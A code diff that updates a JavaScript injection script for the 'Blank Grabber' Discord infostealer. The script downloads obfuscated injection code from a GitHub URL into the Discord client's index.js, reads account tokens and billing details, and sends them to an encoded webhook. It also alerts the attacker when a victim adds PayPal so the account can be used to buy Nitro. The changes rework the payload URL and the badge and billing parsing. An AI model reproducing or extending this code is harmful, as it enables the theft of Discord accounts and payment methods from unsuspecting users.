@@ -1,25 +1,21 @@
-// Credits -> github/addi00000
-// I just modified the original script to suit my needs.
-
 const args = process.argv;
 const fs = require('fs');
 const path = require('path');
 const https = require('https');
 const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
-const Buffer = require('buffer').Buffer
-const hook = '%WEBHOOKHEREBASE64ENCODED%'
+const encodedHook = '%WEBHOOKHEREBASE64ENCODED%'
 
 const config = {
-  webhook: Buffer.from(hook, 'base64').toString('ascii'),
+  webhook: atob(encodedHook),
   webhook_protector_key: '%WEBHOOK_KEY%',
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'Blank Grabber', 
-  embed_icon: 'https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png', 
-  embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/Blank%20Grabber/Data/injection-obfuscated.js', 
+  embed_name: 'Blank Grabber Injection', 
+  embed_icon: 'https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png',
+  embed_color: 5639644, 
+  injection_url: 'https://raw.githubusercontent.com/Blank-c/Discord-Injection-BG/main/injection-obfuscated.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
@@ -448,7 +444,7 @@ fs.readFileSync(indexJs, 'utf8', (err, data) => {
 async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJs);
-        res.replace("'%WEBHOOKHEREBASE64ENCODED%'", "'${hook}'")
+        res.replace('%WEBHOOKHEREBASE64ENCODED%', '${encodedHook}')
         res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
         res.pipe(file);
         file.on('finish', () => {
@@ -498,21 +494,23 @@ const fetchBilling = async (token) => {
 const getBilling = async (token) => {
   const data = await fetchBilling(token);
   if (!data) return '❌';
-  let billing = '';
+  const billing = [];
   data.forEach((x) => {
     if (!x.invalid) {
       switch (x.type) {
         case 1:
-          billing += '💳 ';
+          billing.push('💳');
           break;
         case 2:
-          billing += '<:paypal:951139189389410365> ';
+          billing.push('<:paypal:951139189389410365>');
           break;
+        default:
+            billing.push('(Unknown)');
       }
     }
   });
-  if (!billing) billing = '❌';
-  return billing;
+  if (billing.length == 0) billing.push('❌');
+  return billing.join(' ');
 };
 
 const Purchase = async (token, id, _type, _time) => {
@@ -575,57 +573,76 @@ const getNitro = (flags) => {
     case 1:
       return 'Nitro Classic';
     case 2:
-      return 'Nitro Boost';
+      return 'Nitro';
+    case 3:
+      return 'Nitro Basic';
     default:
-      return 'No Nitro';
+      return '(Unknown)';
   }
 };
 
 const getBadges = (flags) => {
-  let badges = '';
-  switch (flags) {
-    case 1:
-      badges += 'Discord Staff, ';
-      break;
-    case 2:
-      badges += 'Partnered Server Owner, ';
-      break;
-    case 131072:
-      badges += 'Verified Bot Developer, ';
-      break;
-    case 4194304:
-      badges += 'Active Developer, ';
-      break;
-    case 4:
-      badges += 'Hypesquad Event, ';
-      break;
-    case 16384:
-      badges += 'Gold BugHunter, ';
-      break;
-    case 8:
-      badges += 'Green BugHunter, ';
-      break;
-    case 512:
-      badges += 'Early Supporter, ';
-      break;
-    case 128:
-      badges += 'HypeSquad Brillance, ';
-      break;
-    case 64:
-      badges += 'HypeSquad Bravery, ';
-      break;
-    case 256:
-      badges += 'HypeSquad Balance, ';
-      break;
-    case 0:
-      badges = 'None';
-      break;
-    default:
-      badges = 'None';
-      break;
-  }
-  return badges;
-};
+    const badges = [];
+    
+    if (flags >= 4194304) {
+        badges.push('Active Developer')
+        flags -= 4194304
+    }
+    if (flags >= 262144) {
+        badges.push('Moderator Programs Alumni')
+        flags -= 262144
+    }
+    if (flags >= 131072) {
+        badges.push('Early Verified Bot Developer')
+        flags -= 131072
+    }
+    if (flags >= 16384) {
+        badges.push('Discord Bug Hunter (Golden)')
+        flags -= 16384
+    }
+    if (flags >= 512) {
+        badges.push('Early Supporter')
+        flags -= 512
+    }
+    if (flags >= 256) {
+        badges.push('HypeSquad Balance')
+        flags -= 256
+    }
+    if (flags >= 128) {
+        badges.push('HypeSquad Brilliance')
+        flags -= 128
+    }
+    if (flags >= 64) {
+        badges.push('HypeSquad Bravery')
+        flags -= 64
+    }
+    if (flags >= 8) {
+        badges.push('Discord Bug Hunter (Normal)')
+        flags -= 8
+    }
+    if (flags >= 4) {
+        badges.push('HypeSquad Event')
+        flags -= 4
+    }
+    if (flags >= 2) {
+        badges.push('Partnered Server Owner')
+        flags -= 2
+    }
+    if (flags >= 1) {
+        badges.push('Discord Staff')
+        flags -= 1
+    }
+    
+    if (flags == 0) {
+        if (badges.length == 0) {
+            badges.push('None')
+        }
+    } else {
+        badges.push('(Unknown)')
+    }
+    
+    return badges.join(', ');
+  };
 
 const hooker = async (content) => {
   const data = JSON.stringify(content);
@@ -784,7 +801,7 @@ const PaypalAdded = async (token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Paypal Added**',
+            name: '**PayPal Added**',
             value: `Time to buy some nitro baby 😩`,
             inline: false,
           },
